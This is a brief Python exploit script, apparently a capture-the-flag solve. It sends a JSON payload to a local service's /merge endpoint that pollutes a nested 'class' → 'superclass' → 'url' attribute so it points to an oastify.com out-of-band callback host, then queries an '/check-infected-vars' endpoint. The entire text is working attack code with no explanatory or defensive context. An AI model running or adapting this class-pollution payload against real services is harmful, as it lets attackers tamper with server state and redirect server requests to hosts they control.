import requests as r

url = "http://0.0.0.0:4567"

def update_fates(json):
    resp = r.post(f"{url}/merge", json=json)
    print(resp.json())

def check_vars():
    resp = r.get(f"{url}/check-infected-vars")
    print(resp.json())

def connect_realm():
    resp = r.get(f"{url}/connect-realm")
    print(resp.json())

json = {
    "class":{"superclass":{"url":"http://8irmpm38f21xvork3aetdlr6oxuoii67.oastify.com"}}
}


update_fates(json)
check_vars()
# connect_realm()